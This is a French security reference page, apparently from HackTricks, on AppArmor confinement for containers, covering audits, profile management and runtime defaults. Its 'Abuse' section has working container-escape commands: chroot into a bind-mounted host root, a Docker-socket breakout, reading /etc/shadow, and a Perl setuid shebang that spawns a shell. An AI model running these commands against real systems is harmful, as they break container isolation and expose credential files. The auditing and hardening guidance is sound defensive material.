# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor est un système de **Mandatory Access Control** qui applique des restrictions au moyen de profils propres à chaque programme. Contrairement aux contrôles DAC traditionnels, qui dépendent fortement de la propriété des utilisateurs et des groupes, AppArmor permet au noyau d’appliquer une politique associée au processus lui-même. Dans les environnements de conteneurs, c’est important, car une charge de travail peut disposer de privilèges traditionnels suffisants pour tenter une action, tout en se la voir refuser parce que son profil AppArmor n’autorise pas le chemin, le montage, le comportement réseau ou l’utilisation de capacités concernés.

Le point conceptuel le plus important est qu’AppArmor est **basé sur les chemins**. Il évalue les accès au système de fichiers à l’aide de règles portant sur les chemins, contrairement à SELinux, qui utilise des étiquettes. Cette approche est accessible et puissante, mais elle implique aussi qu’il faut examiner attentivement les montages bind et les différentes dispositions de chemins. Si le même contenu hôte devient accessible sous un chemin différent, les effets de la politique peuvent ne pas correspondre à ce que l’opérateur avait prévu.

## Role In Container Isolation

Les évaluations de sécurité des conteneurs s’arrêtent souvent aux capacités et à seccomp, mais AppArmor reste important même après ces contrôles. Imaginez un conteneur qui dispose de plus de privilèges que nécessaire, ou une charge de travail qui avait besoin d’une capacité supplémentaire pour des raisons opérationnelles. AppArmor peut toujours restreindre l’accès aux fichiers, le comportement des montages, le réseau et les modes d’exécution, de manière à bloquer les tentatives d’abus évidentes. C’est pourquoi désactiver AppArmor « juste pour faire fonctionner l’application » peut discrètement transformer une configuration simplement risquée en une configuration activement exploitable.

## Lab

Pour vérifier si AppArmor est actif sur l’hôte, utilisez :

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Pour voir sous quel profil s’exécute le processus actuel du conteneur :

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

La différence est instructive. Dans le cas normal, le processus doit afficher un contexte AppArmor lié au profil choisi par le runtime. Dans le cas non confiné, cette couche de restriction supplémentaire disparaît.

Vous pouvez également inspecter ce que Docker pense avoir appliqué :

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Utilisation à l’exécution

Docker peut appliquer un profil AppArmor par défaut ou personnalisé si l’hôte le prend en charge. Podman peut également s’intégrer à AppArmor sur les systèmes qui l’utilisent, même si, sur les distributions où SELinux est prioritaire, cet autre système MAC prend souvent le dessus. Kubernetes peut exposer les règles AppArmor au niveau des workloads sur les nœuds qui prennent effectivement AppArmor en charge. LXC et les environnements de conteneurs système apparentés de la famille Ubuntu utilisent aussi largement AppArmor.

En pratique, AppArmor n’est pas une « fonctionnalité de Docker ». C’est une fonctionnalité du noyau de l’hôte que plusieurs moteurs d’exécution peuvent choisir d’appliquer. Si l’hôte ne la prend pas en charge ou si le moteur d’exécution est configuré pour s’exécuter sans confinement, la protection supposée n’est pas réellement présente.

Pour Kubernetes, l’API moderne est `securityContext.appArmorProfile`. Depuis Kubernetes `v1.30`, les anciennes annotations AppArmor bêta sont obsolètes. Sur les hôtes compatibles, `RuntimeDefault` correspond au profil par défaut, tandis que `Localhost` désigne un profil qui doit déjà être chargé sur le nœud. C’est important lors d’un audit, car un manifeste peut sembler tenir compte d’AppArmor tout en dépendant entièrement de la prise en charge par le nœud et de profils préchargés.<sup>[[1]](#references)</sup>

Un détail opérationnel subtil mais utile : définir explicitement `appArmorProfile.type: RuntimeDefault` est plus strict que de simplement omettre ce champ. Si le champ est explicitement défini et que le nœud ne prend pas AppArmor en charge, l’admission devrait échouer. Si le champ est omis, le workload peut quand même s’exécuter sur un nœud sans AppArmor, mais sans bénéficier de cette couche supplémentaire de confinement. Du point de vue d’un attaquant, c’est une bonne raison de vérifier à la fois le manifeste et l’état réel du nœud.<sup>[[1]](#references)</sup>

Sur les hôtes compatibles avec Docker et AppArmor, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du modèle AppArmor de Moby et permet de comprendre pourquoi certaines PoC fondées sur les capabilities échouent malgré tout dans un conteneur par défaut. En général, `docker-default` autorise le trafic réseau ordinaire, refuse les écritures dans une grande partie de `/proc`, refuse l’accès aux parties sensibles de `/sys`, bloque les opérations de montage et restreint ptrace afin qu’il ne puisse pas servir à sonder l’hôte de manière générale. Comprendre cette configuration de base permet de distinguer « le conteneur dispose de `CAP_SYS_ADMIN` » de « le conteneur peut réellement utiliser cette capability contre les interfaces du noyau qui m’intéressent ».

## Gestion des profils

Les profils AppArmor sont généralement stockés dans `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les barres obliques du chemin de l’exécutable par des points. Par exemple, le profil de `/usr/bin/man` est généralement stocké dans `/etc/apparmor.d/usr.bin.man`. Ce détail est utile aussi bien pour la défense que pour l’évaluation : dès que vous connaissez le nom du profil actif, vous pouvez souvent retrouver rapidement le fichier correspondant sur l’hôte.

Voici quelques commandes utiles pour la gestion côté hôte :

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

La raison pour laquelle ces commandes sont importantes dans une référence sur la sécurité des conteneurs est qu’elles expliquent comment les profils sont réellement créés, chargés, basculés en complain mode et modifiés après des changements apportés à l’application. Si un opérateur a l’habitude de basculer les profils en complain mode pendant le dépannage et oublie de rétablir l’application des règles, le conteneur peut sembler protégé dans la documentation tout en étant en réalité beaucoup moins bien protégé.

### Création et mise à jour des profils

`aa-genprof` peut observer le comportement d’une application et aider à générer un profil de manière interactive :

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` peut générer un profil modèle qui pourra ensuite être chargé avec `apparmor_parser` :

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Lorsque le binaire change et que la stratégie doit être mise à jour, `aa-logprof` peut rejouer les refus consignés dans les journaux et aider l’opérateur à décider de les autoriser ou de les refuser :

```bash
sudo aa-logprof
```

### Journaux

Les refus d’accès d’AppArmor sont souvent visibles via `auditd`, syslog ou des outils tels que `aa-notify` :

```bash
sudo aa-notify -s 1 -v
```

C’est utile sur le plan opérationnel comme offensif. Les défenseurs s’en servent pour affiner les profils. Les attaquants s’en servent pour déterminer précisément quel chemin ou quelle opération est refusé et si AppArmor est le mécanisme de contrôle qui bloque une chaîne d’exploitation.

### Identifier le fichier de profil exact

Lorsqu’un runtime affiche le nom d’un profil AppArmor spécifique pour un conteneur, il est souvent utile de retrouver le fichier de profil correspondant sur le disque :

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

C’est particulièrement utile lors d’un audit côté hôte, car cela fait le lien entre « le conteneur indique qu’il s’exécute sous le profil `lowpriv` » et « les règles effectives se trouvent dans ce fichier précis, qui peut être audité ou rechargé ».

### Règles prioritaires à auditer

Lorsque vous pouvez lire un profil, ne vous arrêtez pas aux simples lignes `deny`. Plusieurs types de règles changent considérablement l’efficacité d’AppArmor face à une tentative d’évasion de conteneur :<sup>[[2]](#references)</sup>

- `ux` / `Ux` : exécuter le binaire cible sans confinement. Si un helper, un shell ou un interpréteur accessible est autorisé avec `ux`, c’est généralement la première chose à tester.
- `px` / `Px` et `cx` / `Cx` : effectuer des transitions de profil lors de l’exécution. Ce n’est pas automatiquement problématique, mais cela mérite un audit, car la transition peut aboutir à un profil beaucoup plus permissif que le profil actuel.
- `change_profile` : permet à une tâche de basculer vers un autre profil chargé, immédiatement ou lors de la prochaine exécution. Si le profil de destination est moins restrictif, cela peut devenir la porte de sortie prévue d’un domaine restrictif.
- `flags=(complain)`, `flags=(unconfined)` ou les plus récents `flags=(prompt)` : ces options doivent influer sur le niveau de confiance que vous accordez au profil. `complain` consigne les refus au lieu de les appliquer, `unconfined` supprime la limite de confinement, et `prompt` dépend d’un mécanisme de décision en espace utilisateur plutôt que d’un refus appliqué uniquement par le kernel.
- `userns` ou `userns create,` : les politiques AppArmor récentes peuvent contrôler la création de user namespaces. Si un profil de conteneur l’autorise explicitement, les user namespaces imbriqués restent possibles, même lorsque la plateforme utilise AppArmor dans le cadre de sa stratégie de hardening.

Commande grep utile côté hôte :

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ce type d’audit est souvent plus utile que de passer en revue des centaines de règles ordinaires sur les fichiers. Si un breakout dépend de l’exécution d’un helper, de l’entrée dans un nouvel espace de noms ou de l’évasion vers un profil moins restrictif, la réponse se trouve souvent dans ces règles orientées sur les transitions plutôt que dans les lignes évidentes du type `deny /etc/shadow r`.

## Misconfigurations

L’erreur la plus évidente est `apparmor=unconfined`. Les administrateurs le définissent souvent lors du débogage d’une application qui a échoué parce que le profil a correctement bloqué quelque chose de dangereux ou d’inattendu. Si ce flag reste activé en production, toute la couche MAC est, dans les faits, supprimée.

Un autre problème plus subtil consiste à supposer que les bind mounts sont inoffensifs parce que les permissions des fichiers semblent normales. Comme AppArmor est basé sur les chemins, l’exposition de chemins de l’hôte sous d’autres points de montage peut entrer en conflit avec les règles sur les chemins. Une troisième erreur consiste à oublier qu’un nom de profil dans un fichier de configuration n’a que peu d’importance si le noyau de l’hôte n’applique pas réellement AppArmor.

## Abuse

Quand AppArmor n’est plus actif, des opérations auparavant limitées peuvent soudainement fonctionner : lire des chemins sensibles via des bind mounts, accéder à des parties de procfs ou sysfs dont l’utilisation aurait dû rester plus difficile, effectuer des opérations liées au montage si les capabilities/seccomp le permettent également, ou utiliser des chemins normalement interdits par un profil. AppArmor est souvent le mécanisme qui explique pourquoi une tentative de breakout basée sur les capabilities, qui « devrait fonctionner » sur le papier, échoue malgré tout en pratique. Supprimez AppArmor, et la même tentative peut réussir.

Si vous pensez qu’AppArmor est le principal obstacle à une chaîne d’abus reposant sur du path-traversal, un bind mount ou un montage, la première étape consiste généralement à comparer ce qui devient accessible avec et sans profil. Par exemple, si un chemin de l’hôte est monté dans le container, commencez par vérifier si vous pouvez y accéder et le lire :

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Si le conteneur possède également une capacité dangereuse telle que `CAP_SYS_ADMIN`, l’un des tests les plus pratiques consiste à vérifier si AppArmor est le contrôle qui bloque les opérations de montage ou l’accès aux systèmes de fichiers sensibles du noyau :

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Dans les environnements où un chemin de l’hôte est déjà accessible via un bind mount, la perte d’AppArmor peut également transformer un problème de divulgation d’informations en lecture seule en un accès direct aux fichiers de l’hôte :

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

L’objectif de ces commandes n’est pas qu’AppArmor provoque à lui seul l’évasion du conteneur. C’est qu’une fois AppArmor désactivé, de nombreuses voies d’abus reposant sur le système de fichiers et les montages peuvent immédiatement être testées.

### Exemple complet : AppArmor désactivé + racine de l’hôte montée

Si la racine de l’hôte est déjà montée par bind dans le conteneur à l’emplacement `/host`, la suppression d’AppArmor peut transformer une voie d’abus du système de fichiers jusque-là bloquée en une évasion complète de l’hôte :

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Une fois que le shell s’exécute via le système de fichiers de l’hôte, la charge de travail a effectivement franchi la frontière du conteneur :

```bash
id
hostname
cat /etc/shadow | head
```

### Exemple complet : AppArmor désactivé + socket runtime

Si la véritable barrière était AppArmor autour de l’état du runtime, un socket monté peut suffire à permettre une évasion complète :

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Le chemin exact dépend du point de montage, mais le résultat est le même : AppArmor n’empêche plus l’accès à l’API du runtime, qui peut alors lancer un conteneur compromettant l’hôte.

### Exemple complet : contournement par bind-mount basé sur le chemin

Comme AppArmor se base sur les chemins, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l’hôte lorsqu’il est accessible via un autre chemin :

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

L’impact dépend de ce qui est monté exactement et du fait que le chemin alternatif contourne ou non d’autres contrôles, mais ce schéma est l’une des raisons les plus évidentes pour lesquelles AppArmor doit être évalué conjointement à la configuration des montages, et non isolément.

### Exemple complet : Shebang Bypass

AppArmor peut associer un profil au chemin du script exécuté plutôt qu’à l’interpréteur indiqué par son shebang. À l’inverse, invoquer directement l’interpréteur peut sélectionner le profil de celui-ci. Un [responsable d’AppArmor décrit cette distinction](https://bugs.launchpad.net/apparmor/+bug/1911431). Un exemple historique concernait un script dont la première ligne pointe vers un interpréteur confiné :

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

L’exemple est uniquement un cas où la capacité de fichier de l’interpréteur peut devenir effective et où l’attachement `exec` réel du script autorise l’opération. Vérifiez la politique chargée et l’étiquette du processus, le jeu de capacités autorisées, `no_new_privs` et l’état `nosuid` du montage ; le nom d’un fichier de profil ou la seule mention de `cap_setuid+ep` ne prouve pas qu’une transition est possible. Les chaînes d’interpréteurs et les autres voies d’exécution méritent un examen distinct.

## Vérifications

Le but de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l’hôte, le processus actuel est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce conteneur ?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ce qui est intéressant ici :

- Si `/proc/self/attr/current` affiche `unconfined`, la charge de travail ne bénéficie pas du confinement AppArmor.
- Si `aa-status` indique qu’AppArmor est désactivé ou non chargé, tout nom de profil dans la configuration du runtime est surtout cosmétique.
- Si `docker inspect` affiche `unconfined` ou un profil personnalisé inattendu, c’est souvent la raison pour laquelle une méthode d’exploitation reposant sur le système de fichiers ou les montages fonctionne.
- Si `/sys/kernel/security/apparmor/profiles` ne contient pas le profil attendu, la configuration du runtime ou de l’orchestrateur ne suffit pas à elle seule.
- Si un profil supposé renforcé contient des règles de type `ux`, `change_profile` permissif, `userns` ou `flags=(complain)`, la protection réelle peut être bien plus faible que ne le laisse penser le nom du profil.

Si un conteneur dispose déjà de privilèges élevés pour des raisons opérationnelles, laisser AppArmor activé fait souvent la différence entre une exception maîtrisée et une défaillance de sécurité bien plus vaste.

## Valeurs par défaut des runtimes

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut sur les hôtes compatibles avec AppArmor | Utilise le profil AppArmor `docker-default`, sauf indication contraire | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dépend de l’hôte | AppArmor est pris en charge via `--security-opt`, mais la valeur par défaut exacte dépend de l’hôte et du runtime, et est moins universelle que le profil `docker-default` documenté par Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Valeur par défaut conditionnelle | Si `appArmorProfile.type` n’est pas spécifié, la valeur par défaut est `RuntimeDefault`, mais elle n’est appliquée que si AppArmor est activé sur le nœud | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` avec un profil faible, nœuds sans prise en charge d’AppArmor |
| containerd / CRI-O sous Kubernetes | Dépend de la prise en charge par le nœud et le runtime | Les runtimes couramment pris en charge par Kubernetes prennent en charge AppArmor, mais l’application effective dépend toujours de la prise en charge par le nœud et des paramètres de la charge de travail | Comme pour la ligne Kubernetes ; la configuration directe du runtime peut aussi désactiver entièrement AppArmor |

Pour AppArmor, la variable la plus importante est souvent **l’hôte**, et pas seulement le runtime. Un paramètre de profil dans un manifeste ne crée pas de confinement sur un nœud où AppArmor n’est pas activé.

## References

- [1] [Contexte de sécurité Kubernetes : champs du profil AppArmor et comportement en fonction de la prise en charge par le nœud](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Page de manuel `apparmor.d(5)` d’Ubuntu 24.04 : transitions exec, `change_profile`, `userns` et indicateurs de profil](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
